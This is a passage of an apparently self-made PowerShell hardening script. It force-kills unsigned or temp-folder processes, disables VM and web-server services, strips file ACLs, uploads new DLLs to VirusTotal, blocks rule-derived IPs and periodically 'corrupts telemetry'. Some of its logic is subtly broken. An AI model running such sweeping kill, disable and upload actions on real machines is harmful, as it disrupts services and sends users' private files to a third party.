            "$env:LOCALAPPDATA\*",
            "$env:TEMP\*",
            "$env:USERPROFILE\Downloads\*"
        )
        $processes = Get-Process | Where-Object { $_.Modules }
        foreach ($process in $processes) {
            if ($whitelistedProcesses -contains $process.Name.ToLower()) { continue }
            foreach ($module in $process.Modules) {
                $modulePath = $module.FileName
                if ($nonStandardPaths | Where-Object { $modulePath -like $_ }) {
                    try {
                        Stop-Process -Id $process.Id -Force -ErrorAction Stop
                        Write-Log "Killed process $($process.Name) (PID: $($process.Id)) using DLL from non-standard path: $modulePath"
                        Quarantine-File-GS3 -filePath $modulePath
                    } catch {
                        Write-Log "Failed to kill process $($process.Name) for DLL ${modulePath}: $_" -EntryType "Error" -Color "Red"
                    }
                } elseif (-not (Is-SignedFileValid-GS3 -filePath $modulePath)) {
                    try {
                        Stop-Process -Id $process.Id -Force -ErrorAction Stop
                        Write-Log "Killed process $($process.Name) (PID: $($process.Id)) using unsigned DLL: $modulePath"
                        Quarantine-File-GS3 -filePath $modulePath
                    } catch {
                        Write-Log "Failed to kill process $($process.Name) for unsigned DLL ${modulePath}: $_" -EntryType "Error" -Color "Red"
                    }
                }
            }
        }
    } catch {
        Write-Log "Error killing DLLs (GS3): $_" -EntryType "Error" -Color "Red"
    }
}

# Kill VMs (from GS.ps1)
function Kill-VMs-GS {
    Write-Log "Killing virtual machine processes (GS)..."
    $vmProcesses = @("vmware-vmx", "VBoxHeadless", "VBoxSVC", "vmnat", "vmnetdhcp", "qemu-system-x86_64", "hyperv")
    foreach ($proc in $vmProcesses) {
        $processes = Get-Process -Name $proc -ErrorAction SilentlyContinue
        foreach ($process in $processes) {
            try {
                Stop-Process -Id $process.Id -Force -ErrorAction Stop
                Write-Log "Killed VM process: $($process.Name) (PID: $($process.Id))"
            } catch {
                Write-Log "Failed to kill VM process $($process.Name): $_" -EntryType "Error" -Color "Red"
            }
        }
    }
    $vmServices = @("VMwareHostd", "VBoxSDS", "VMTools")
    foreach ($service in $vmServices) {
        if (Get-Service -Name $service -ErrorAction SilentlyContinue) {
            Stop-Service -Name $service -Force -ErrorAction SilentlyContinue
            Set-Service -Name $service -StartupType Disabled -ErrorAction SilentlyContinue
            Write-Log "Disabled VM service: $service"
        }
    }
    Write-Log "VM killing (GS) complete."
}

# Kill web servers (from GS.ps1)
function Kill-WebServers-GS {
    Write-Log "Killing web server processes and services (GS)..."
    $webProcesses = @("w3wp", "httpd", "nginx")
    foreach ($proc in $webProcesses) {
        $processes = Get-Process -Name $proc -ErrorAction SilentlyContinue
        foreach ($process in $processes) {
            try {
                Stop-Process -Id $process.Id -Force -ErrorAction Stop
                Write-Log "Killed web server process: $($process.Name) (PID: $($process.Id))"
            } catch {
                Write-Log "Failed to kill web server process $($process.Name): $_" -EntryType "Error" -Color "Red"
            }
        }
    }
    $webServices = @("W3SVC", "HTTP")
    foreach ($service in $webServices) {
        if (Get-Service -Name $service -ErrorAction SilentlyContinue) {
            Stop-Service -Name $service -Force -ErrorAction SilentlyContinue
            Set-Service -Name $service -StartupType Disabled -ErrorAction SilentlyContinue
            Write-Log "Disabled web server service: $service"
        }
    }
    $ruleName = "Block Web Ports"
    if (-not (Get-NetFirewallRule -DisplayName $ruleName -ErrorAction SilentlyContinue)) {
        New-NetFirewallRule -DisplayName $ruleName -Direction Inbound -Protocol TCP -LocalPort 80,443 -Action Block -ErrorAction SilentlyContinue
        Write-Log "Blocked web server ports 80 and 443"
    }
    Write-Log "Web server killing (GS) complete."
}

# Antivirus functions (from GS3.ps1)
function Stop-ProcessUsingDLL-GS3 {
    param ([string]$filePath)
    try {
        $processes = Get-Process | Where-Object { $_.Modules | Where-Object { $_.FileName -eq $filePath } }
        foreach ($process in $processes) {
            taskkill /F /PID $process.Id | Out-Null
            Write-Log "Killed process $($process.Name) (PID: $($process.Id)) (GS3)"
            $parentId = (Get-CimInstance -ClassName Win32_Process -Filter "ProcessId = $($process.Id)").ParentProcessId
            if ($parentId -and $parentId -ne 0 -and $parentId -ne $process.Id) {
                $parentProc = Get-Process -Id $parentId -ErrorAction SilentlyContinue
                if ($parentProc) {
                    taskkill /F /PID $parentId | Out-Null
                    Write-Log "Killed parent process $($parentProc.Name) (PID: $parentId) (GS3)"
                }
            }
        }
    } catch {
        Write-Log "Failed to stop process using ${filePath} (GS3): $_" -EntryType "Error" -Color "Red"
    }
}

function Set-FileOwnershipAndPermissions-GS3 {
    param ([string]$filePath)
    try {
        takeown /F $filePath /A | Out-Null
        icacls $filePath /inheritance:d | Out-Null
        icacls $filePath /grant "Administrators:F" | Out-Null
        Write-Log "Set ownership and permissions for ${filePath} (GS3)"
        return $true
    } catch {
        Write-Log "Failed to set ownership/permissions for ${filePath} (GS3): $_" -EntryType "Error" -Color "Red"
        return $false
    }
}

function Is-SignedFileValid-GS3 {
    param ([string]$filePath)
    try {
        $signature = Get-AuthenticodeSignature -FilePath $filePath -ErrorAction Stop
        Write-Log "Signature status: $($signature.Status) for ${filePath} (GS3)"
        return ($signature.Status -eq "Valid")
    } catch {
        Write-Log "Signature check failed for ${filePath} (GS3): $_" -EntryType "Error" -Color "Red"
        return $false
    }
}

function Quarantine-File-GS3 {
    param ([string]$filePath)
    $maxRetries = 3
    $retryCount = 0
    $success = $false
    while (-not $success -and $retryCount -lt $maxRetries) {
        try {
            $quarantinePath = Join-Path -Path $quarantineFolder -ChildPath (Split-Path $filePath -Leaf)
            Move-Item -Path $filePath -Destination $quarantinePath -Force -ErrorAction Stop
            Write-Log "Quarantined file: ${filePath} to $quarantinePath (GS3)"
            $success = $true
        } catch {
            Write-Log "Retry $($retryCount + 1)/$maxRetries - Failed to quarantine ${filePath} (GS3): $_" -EntryType "Warning" -Color "Yellow"
            Start-Sleep -Seconds 1
            $retryCount++
        }
    }
    if (-not $success) {
        Write-Log "Quarantine of ${filePath} failed after $maxRetries retries (GS3)" -EntryType "Error" -Color "Red"
    }
}

# VirusTotal scanning (from GS.ps1)
function Get-VirusTotalScan-GS {
    param ([string]$FilePath)
    $fileHash = (Get-FileHash -Algorithm SHA256 -Path $FilePath -ErrorAction SilentlyContinue).Hash
    if ($scannedFiles.ContainsKey($fileHash)) {
        Write-Log "File hash $fileHash found in cache (clean) (GS)."
        return $null
    }
    $headers = @{"x-apikey" = $VirusTotalApiKey}
    $fileSize = (Get-Item $FilePath -ErrorAction SilentlyContinue).Length
    $url = "https://www.virustotal.com/api/v3/files/$fileHash"
    try {
        $response = Invoke-RestMethod -Uri $url -Headers $headers -Method Get -ErrorAction SilentlyContinue
        if ($response -and $response.data.attributes.last_analysis_stats.malicious -eq 0) {
            Write-Log "File $FilePath is clean, already scanned (GS)."
            $scannedFiles[$fileHash] = $true
            return $response
        } elseif ($response) {
            Write-Log "File $FilePath found in VirusTotal with malicious detections (GS)."
            return $response
        }
    } catch {
        Write-Log "File $FilePath not found in VirusTotal database or error occurred (GS): $_" -EntryType "Warning" -Color "Yellow"
    }
    if ($fileSize -gt 32MB) {
        Write-Log "File $FilePath exceeds 32MB VirusTotal limit. Skipping upload (GS)." -EntryType "Warning" -Color "Yellow"
        return $null
    }
    Write-Log "Uploading file $FilePath to VirusTotal for analysis (GS)."
    $uploadUrl = "https://www.virustotal.com/api/v3/files"
    $fileContent = [System.IO.File]::ReadAllBytes($FilePath)
    $boundary = [System.Guid]::NewGuid().ToString()
    $body = @"
--$boundary
Content-Disposition: form-data; name="file"; filename="$([System.IO.Path]::GetFileName($FilePath))"
Content-Type: application/octet-stream

$([System.Text.Encoding]::Default.GetString($fileContent))
--$boundary--
"@
    try {
        $uploadResponse = Invoke-RestMethod -Uri $uploadUrl -Headers $headers -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body -ErrorAction Stop
        $analysisId = $uploadResponse.data.id
        Write-Log "File $FilePath uploaded to VirusTotal. Analysis ID: $analysisId (GS)"
        $analysisUrl = "https://www.virustotal.com/api/v3/analyses/$analysisId"
        $maxAttempts = 10
        $attempt = 0
        $delaySeconds = 30
        do {
            Start-Sleep -Seconds $delaySeconds
            $attempt++
            $analysisResponse = Invoke-RestMethod -Uri $analysisUrl -Headers $headers -Method Get -ErrorAction Stop
            if ($analysisResponse.data.attributes.status -eq "completed") {
                Write-Log "Analysis for $FilePath completed (GS)."
                break
            }
            Write-Log "Waiting for analysis of $FilePath (Attempt $attempt/$maxAttempts) (GS)..."
        } while ($attempt -lt $maxAttempts)
        if ($analysisResponse.data.attributes.status -ne "completed") {
            Write-Log "Analysis for $FilePath did not complete within time limit (GS)." -EntryType "Warning" -Color "Yellow"
            return $null
        }
        $scanResults = Invoke-RestMethod -Uri $url -Headers $headers -Method Get -ErrorAction Stop
        if ($scanResults.data.attributes.last_analysis_stats.malicious -eq 0) {
            Write-Log "File $FilePath is clean according to VirusTotal (GS)."
            $scannedFiles[$fileHash] = $true
        }
        return $scanResults
    } catch {
        Write-Log "Error uploading or analyzing $FilePath with VirusTotal (GS): $_" -EntryType "Error" -Color "Red"
        return $null
    }
}

# Block execution (from GS.ps1)
function Block-Execution-GS {
    param ([string]$FilePath, [string]$Reason)
    try {
        $acl = Get-Acl -Path $FilePath -ErrorAction Stop
        $acl.SetAccessRuleProtection($true, $false)
        $acl.Access | ForEach-Object { $acl.RemoveAccessRule($_) }
        Set-Acl -Path $FilePath -AclObject $acl -ErrorAction Stop
        Write-Log "Blocked file ${FilePath}: ${Reason} (GS)"
    } catch {
        Write-Log "Error blocking execution of ${FilePath} (GS): $_" -EntryType "Error" -Color "Red"
    }
}

# File system monitoring (from GS3.ps1)
function Monitor-FileSystem-GS3 {
    Write-Log "Setting up file system monitoring (GS3)..."
    $drives = Get-CimInstance -ClassName Win32_LogicalDisk | Where-Object { $_.DriveType -in 2, 3, 4 }
    foreach ($drive in $drives) {
        $path = $drive.DeviceID + "\"
        try {
            $watcher = New-Object System.IO.FileSystemWatcher
            $watcher.Path = $path
            $watcher.IncludeSubdirectories = $true
            $watcher.Filter = "*.dll"
            $watcher.EnableRaisingEvents = $true
            Register-ObjectEvent -InputObject $watcher -EventName "Created" -Action {
                Start-Sleep -Milliseconds 500
                $fullPath = $Event.SourceEventArgs.FullPath
                if (Test-Path $fullPath -PathType Leaf -and $fullPath -like "*.dll") {
                    $isValid = Is-SignedFileValid-GS3 -filePath $fullPath
                    if (-not $isValid) {
                        if (Set-FileOwnershipAndPermissions-GS3 -filePath $fullPath) {
                            Stop-ProcessUsingDLL-GS3 -filePath $fullPath
                            Quarantine-File-GS3 -filePath $fullPath
                        }
                    }
                }
                $scanResults = Get-VirusTotalScan-GS -FilePath $fullPath
                if ($scanResults -and $scanResults.data.attributes.last_analysis_stats.malicious -gt 0) {
                    Block-Execution-GS -FilePath $fullPath -Reason "File detected as malware on VirusTotal"
                }
            } | Out-Null
            Register-ObjectEvent -InputObject $watcher -EventName "Changed" -Action {
                Start-Sleep -Milliseconds 500
                $fullPath = $Event.SourceEventArgs.FullPath
                if (Test-Path $fullPath -PathType Leaf -and $fullPath -like "*.dll") {
                    $isValid = Is-SignedFileValid-GS3 -filePath $fullPath
                    if (-not $isValid) {
                        if (Set-FileOwnershipAndPermissions-GS3 -filePath $fullPath) {
                            Stop-ProcessUsingDLL-GS3 -filePath $fullPath
                            Quarantine-File-GS3 -filePath $fullPath
                        }
                    }
                }
            } | Out-Null
            Write-Log "File system watcher set on drive: $path (GS3)"
        } catch {
            Write-Log "Failed to start watcher on ${path} (GS3): $_" -EntryType "Error" -Color "Red"
        }
    }
}

# Security rules (from GSecurity.ps1)
function Apply-SecurityRules-GSecurity {
    Write-Log "Applying security rules (GSecurity)..."
    function Get-SecurityRules {
        $tempDir = "$env:TEMP\security_rules"
        if (-not (Test-Path $tempDir)) { New-Item -ItemType Directory -Path $tempDir | Out-Null }
        $yaraZip = "$tempDir\yara_rules.zip"
        Invoke-WebRequest -Uri "https://github.com/Yara-Rules/rules/archive/refs/heads/master.zip" -OutFile $yaraZip -ErrorAction Stop
        Expand-Archive -Path $yaraZip -DestinationPath "$tempDir\yara" -Force
        $yaraRules = Get-ChildItem -Path "$tempDir\yara" -Recurse -Include "*.yar"
        $sigmaZip = "$tempDir\sigma_rules.zip"
        Invoke-WebRequest -Uri "https://github.com/SigmaHQ/sigma/archive/refs/heads/master.zip" -OutFile $sigmaZip -ErrorAction Stop
        Expand-Archive -Path $sigmaZip -DestinationPath "$tempDir\sigma" -Force
        $sigmaRules = Get-ChildItem -Path "$tempDir\sigma" -Recurse -Include "*.yml"
        $snortRules = "$tempDir\snort.rules"
        Invoke-WebRequest -Uri "https://www.snort.org/downloads/community/community-rules" -OutFile $snortRules -ErrorAction Stop
        Write-Log "Successfully downloaded YARA, Sigma, and Snort rules (GSecurity)."
        return @{ Yara = $yaraRules; Sigma = $sigmaRules; Snort = $snortRules }
    }
    function Parse-Rules {
        param ($Rules)
        $indicators = @()
        foreach ($rule in $Rules.Yara) {
            $content = Get-Content $rule.FullName -ErrorAction SilentlyContinue
            if ($content -match 'meta:.*hash\s*=\s*"([a-f0-9]{32,64})"') {
                $indicators += @{ Type = "Hash"; Value = $matches[1]; Source = "YARA" }
            }
            if ($content -match 'meta:.*filename\s*=\s*"([^"]+)"') {
                $indicators += @{ Type = "FileName"; Value = $matches[1]; Source = "YARA" }
            }
        }
        foreach ($rule in $Rules.Sigma) {
            $content = Get-Content $rule.FullName -ErrorAction SilentlyContinue
            if ($content -match 'process_creation:.*image:.*\\([^\s]+.exe)') {
                $indicators += @{ Type = "FileName"; Value = $matches[1]; Source = "Sigma" }
            }
        }
        if (Test-Path $Rules.Snort) {
            foreach ($line in (Get-Content $Rules.Snort -ErrorAction SilentlyContinue)) {
                if ($line -match 'alert.*dst\s+(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})') {
                    $indicators += @{ Type = "IP"; Value = $matches[1]; Source = "Snort" }
                }
            }
        }
        Write-Log "Parsed $($indicators.Count) indicators from rules (GSecurity)."
        return $indicators
    }
    function Apply-Rules {
        param ($Indicators)
        $asrRules = @{}
        foreach ($indicator in $Indicators) {
            if ($indicator.Type -eq "FileName" -and $indicator.Source -in @("YARA", "Sigma")) {
                $asrRules[$indicator.Value] = $true
            }
        }
        foreach ($exe in $asrRules.Keys) {
            try {
                Add-MpPreference -AttackSurfaceReductionRules_Ids "e6db77e5-3df2-4cf1-b95a-636979351e5b" `
                                 -AttackSurfaceReductionRules_Actions Enabled `
                                 -AttackSurfaceReductionRules_ExecutablePaths $exe -ErrorAction Stop
                Write-Log "Blocked executable via ASR: $exe (GSecurity)"
            } catch {
                Write-Log "Error applying ASR rule for ${exe} (GSecurity): $_" -EntryType "Warning" -Color "Yellow"
            }
        }
        foreach ($indicator in $Indicators) {
            if ($indicator.Type -eq "IP") {
                try {
                    New-NetFirewallRule -Name "Block_C2_$($indicator.Value)" -Direction Outbound -Action Block `
                                       -RemoteAddress $indicator.Value -ErrorAction Stop
                    Write-Log "Blocked IP via Firewall: $($indicator.Value) (GSecurity)"
                } catch {
                    Write-Log "Error applying Firewall rule for $($indicator.Value) (GSecurity): $_" -EntryType "Warning" -Color "Yellow"
                }
            }
        }
    }
    function Start-ProcessMonitor {
        param ($Indicators)
        $fileNames = $Indicators | Where-Object { $_.Type -eq "FileName" } | Select-Object -ExpandProperty Value
        Register-WmiEvent -Query "SELECT * FROM __InstanceCreationEvent WITHIN 1 WHERE TargetInstance ISA 'Win32_Process'" -Action {
            $process = $event.SourceEventArgs.NewEvent.TargetInstance
            if ($fileNames -contains $process.Name) {
                try {
                    Stop-Process -Id $process.ProcessId -Force -ErrorAction Stop
                    Write-Log "Blocked malicious process: $($process.Name) (GSecurity)" -EntryType "Warning" -Color "Yellow"
                } catch {
                    Write-Log "Error blocking process $($process.Name) (GSecurity): $_" -EntryType "Error" -Color "Red"
                }
            }
        }
        Write-Log "Process monitoring started (GSecurity)."
    }
    if ($Start) {
        $tempDir = "$env:TEMP\security_rules"
        if (Test-Path $tempDir) {
            $rules = @{
                Yara = Get-ChildItem -Path "$tempDir\yara" -Recurse -Include "*.yar" -ErrorAction SilentlyContinue
                Sigma = Get-ChildItem -Path "$tempDir\sigma" -Recurse -Include "*.yml" -ErrorAction SilentlyContinue
                Snort = "$tempDir\snort.rules"
            }
            $indicators = Parse-Rules -Rules $rules
            Apply-Rules -Indicators $indicators
            Start-ProcessMonitor -Indicators $indicators
        } else {
            Write-Log "Cached rules not found. Downloading new rules (GSecurity)." -EntryType "Warning" -Color "Yellow"
            $rules = Get-SecurityRules
            $indicators = Parse-Rules -Rules $rules
            Apply-Rules -Indicators $indicators
            Start-ProcessMonitor -Indicators $indicators
        }
    } else {
        $rules = Get-SecurityRules
        $indicators = Parse-Rules -Rules $rules
        Apply-Rules -Indicators $indicators
        Start-ProcessMonitor -Indicators $indicators
    }
    Write-Log "Security rules (GSecurity) applied."
}

# Process monitoring (from GS.ps1)
function Monitor-Processes-GS {
    Write-Log "Starting process monitoring (GS)..."
    Register-WmiEvent -Query "SELECT * FROM __InstanceCreationEvent WITHIN 1 WHERE TargetInstance ISA 'Win32_Process'" -Action {
        $process = $event.SourceEventArgs.NewEvent.TargetInstance
        if ($script:whitelistedProcesses -notcontains $process.Name.ToLower()) {
            Write-Log "New process detected: $($process.Name) (PID: $($process.ProcessId)) (GS)"
            $isValid = Is-SignedFileValid-GS3 -filePath $process.ExecutablePath
            if (-not $isValid) {
                try {
                    Stop-Process -Id $process.ProcessId -Force -ErrorAction Stop
                    Write-Log "Terminated unsigned process: $($process.Name) (GS)" -EntryType "Warning" -Color "Yellow"
                } catch {
                    Write-Log "Error terminating process $($process.Name) (GS): $_" -EntryType "Error" -Color "Red"
                }
            }
        }
    }
    Write-Log "Process monitoring (GS) started."
}

# Main execution
try {
    Write-Log "Starting CombinedSecurity script..."
    Initialize-Quarantine
    if (-not $Start) {
        Schedule-StartupTask
        if ($AddToStartup) {
            Add-ToStartup
        }
    }
    # Execute all hardening functions
    Harden-BrowserVirtualization-GS2
    Harden-AudioSettings-GS2
    Harden-AudioSettings-GSecurity
    Harden-BrowserSettings-GSecurity
    Disable-ChromeRemoteDesktop-GS2
    Harden-NetworkAndServices-GS2
    Optimize-Network-GSecurity
    Harden-PrivilegeRights-GS2
    Harden-PrivilegeRights-GS
    Harden-WDACPolicy-GS2
    Restrict-Devices-GSecurity
    Configure-UAC-GS
    Kill-DLLs-GS3
    Kill-VMs-GS
    Kill-WebServers-GS
    # Execute telemetry corruption periodically
    if ((Get-Date) - $lastTelemetryCorruptTime -gt (New-TimeSpan -Hours 24)) {
        Corrupt-Telemetry-GS
        $script:lastTelemetryCorruptTime = Get-Date
    }
    # Start monitoring functions in background
    $job1 = Start-Job -ScriptBlock { Monitor-VPN-GS }
    $job2 = Start-Job -ScriptBlock { Monitor-FileSystem-GS3 }
    $job3 = Start-Job -ScriptBlock { Apply-SecurityRules-GSecurity }
    $job4 = Start-Job -ScriptBlock { Monitor-Processes-GS }
    Write-Log "Started background jobs for VPN, file system, security rules, and process monitoring."
    # Keep script running
    while ($true) {
        Start-Sleep -Seconds 3600
        if ((Get-Date) - $lastTelemetryCorruptTime -gt (New-TimeSpan -Hours 24)) {
            Corrupt-Telemetry-GS
            $lastTelemetryCorruptTime = Get-Date
        }
        Kill-DLLs-GS3
        Kill-VMs-GS
        Kill-WebServers-GS
    }
} catch {
    Write-Log "Critical error in main execution: $_" -EntryType "Error" -Color "Red"
    exit 1
} finally {
    if ($originalPolicy -ne "Unrestricted") {
        Set-ExecutionPolicy -ExecutionPolicy $originalPolicy -Scope Process -Force
        Write-Log "Restored original execution policy: $originalPolicy"
    }
}